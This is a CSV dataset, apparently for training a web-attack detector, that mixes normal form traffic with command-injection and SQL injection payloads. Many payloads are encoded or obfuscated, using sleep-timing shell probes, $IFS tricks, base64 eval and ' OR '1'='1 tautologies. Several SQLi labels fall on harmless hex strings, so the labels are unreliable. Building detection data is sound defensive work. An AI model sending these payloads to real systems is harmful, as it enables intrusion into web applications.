payload,label,source
Onlina,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FOKDAL%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20YBRDJI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C,CMD,seclists_cmd
%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3%00D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,obfuscation:null_byte
%27%0aecho$IFSXIUKHX$((92%2B44))$(echo$IFSXIUKHX)XIUKHX',CMD,seclists_cmd
eval(atob('JTIwZWNobyUyMERSRllOQiQoKDclMkI5NykpJChlY2hvJTIwRFJGWQ=='))NB)DRFYNB|,CMD,obfuscation:base64_fragment
5574AF6AA31E2AF6FC5762C0CC736BA7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
066F\u0045\u0045\u0044\u0043009\u004396B0\u0042\u00444C7234A010196F,SQLi,obfuscation:unicode_escape
8B7E9DC83E7C2705B99C56B9330E8D44' OR '1'='1,SQLi,obfuscation:logic_or_tautology
ben%00aderet@introito.io,SQLi,obfuscation:null_byte
57C39622460EEF6D74D427AB54422931,Normal,csic_gsi:cisc_normalTraffic_train.txt
ATaC%00ado,SQLi,obfuscation:null_byte
%252526echo%2524IFSIQEANB%2524%2528%252837%25252B80%2529%2529%2524%2528echo%2524IFSIQEANB%2529IQEANB%2526,CMD,obfuscation:double_url_encode
%25250A%252520str%25253D%252524%252528echo%252520EIGKOY%252529%25250A%252520str1%25253D%252524%25257B%252523str%25257D%25250A%252520if%252520%25255B%2525209%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25250A%252520then%252520sleep%2525200%25250A%252520else%252520sleep%2525201%25250A%252520fi%252520%2525252F%2525252F,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary34644
Content-Disposition: form-data; name=""q""

%27&&echo%20EFAUWG$((53%2B25))$(echo%20EFAUWG)EFAUWG%7C
--WebKitFormBoundary34644--",CMD,obfuscation:multipart_boundary_sim
%25250aecho%252520URBCMK%2524%2528%252817%25252B54%2529%2529%2524%2528echo%252520URBCMK%2529URBCMK%252527,CMD,obfuscation:double_url_encode
"modo=registro&login=rechelle&password=4ri9c4&nombre=Danna&apellidos=Grillo+Matamalas&email=funkvist@engomera.com.com&dni=44373062J&direccion=Paracuellos,+S/N+&ciudad=Abanilla&cp=44643&provincia=Le�n&ntc=2100619474329828&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
id/**/=/**/1&nombre/**/=/**/Jam�n+Ib�rico&precio/**/=/**/100&cantidad/**/=/**/40&B1A/**/=/**/A�adir+al+carrito,SQLi,obfuscation:inline_comment
9FFF111EAEF08B8D878301A23FB12E89,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520EHNNQT%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25203%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520,CMD,obfuscation:url_encode
13st7l75n,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%250A%2520str%253D%2524%2528echo%2520DPBAVN%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25201%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2527,CMD,obfuscation:url_encode
choncha%00n,SQLi,obfuscation:null_byte
id=1&nombre=Jam�n+Ib�rico&precio=39&cantidad=14&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
laurA,SQLi,obfuscation:case_random
D7C2BFF1B0E1B4C711E69C10CAE56D4C,Normal,csic_gsi:cisc_normalTraffic_test.txt
"|echo%20IQBIEF$((77%2B16))$(echo%20IQBIEF)IQBIEF""",CMD,seclists_cmd
%26%26echo$IFSHWUDRE$((0%2B26))$(echo$IFSHWUDRE)HWUDRE\' OR '1'='1,SQLi,obfuscation:logic_or_tautology
8EB969f6841DD67eC88741A44c662948,SQLi,obfuscation:case_random
%2527%3B%20stR%3D%24%28EcHo%20ZAhUzd%29%3b%20STR1%3D%24%7b%23STr%7d%3B%20iF%20%5B%206%20-Ne%20%24%7BStR1%7D%20%5d%3B%20tHen%20SLeeP%200%3b%20ELSE%20SlEep%201%3B%20fI%20%2526,CMD,obfuscation:case_random
id='OR'a='a,SQLi,community:payloads_seed
3176AE372672E2EA1865D9C877189B85/*--*/,SQLi,obfuscation:nested_comment
4214809525884531/*--*/,SQLi,obfuscation:nested_comment
"{""a"":{""b"":""B6CCCE674A6E781A9332581482E4A639""}}",SQLi,obfuscation:json_nested_escape
||echo$IFSVSCFSB$((3%2B2))$(echo$IFSVSCFSB)VSCFSB\,CMD,seclists_cmd
C9aD73bD699CfcA24D3379F39CcbDfa8,SQLi,obfuscation:case_random
CCCCAFB59997F5E3D6B056C0E0B58600' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%2527%7C%20%5B%206%20-Ne%20%24%28eCHO%20lVDdNf%20%7C%20tR%20-D%20%27%5cN%27%20%7C%20Wc%20-c%29%20%5D%20%7C%7C%20sLeeP%201%20%2527,CMD,obfuscation:case_random
6E12B2A8CB915964F2FBDAA448CDF164,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%25257Cecho%2524IFSZQOGYN%2524%2528%252831%25252B70%2529%2529%2524%2528echo%2524IFSZQOGYN%2529ZQOGYN%2527,CMD,obfuscation:double_url_encode
CB62CA82EB09713D82DC9D3C2%0074F7BBF,SQLi,obfuscation:null_byte
nakadai_newell@intercambioenlaces.tn,Normal,csic_gsi:cisc_normalTraffic_train.txt
1D9E77E7D5C021523042FBAE3AB5DA79,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,seclists_cmd
%2526%2526echo%2524IFSCWFCPC%2524%2528%252835%25252B74%2529%2529%2524%2528echo%2524IFSCWFCPC%2529CWFCPC%2527,CMD,obfuscation:double_url_encode
8F89FE31320878EC12548F33A7A2D453/*--*/,SQLi,obfuscation:nested_comment
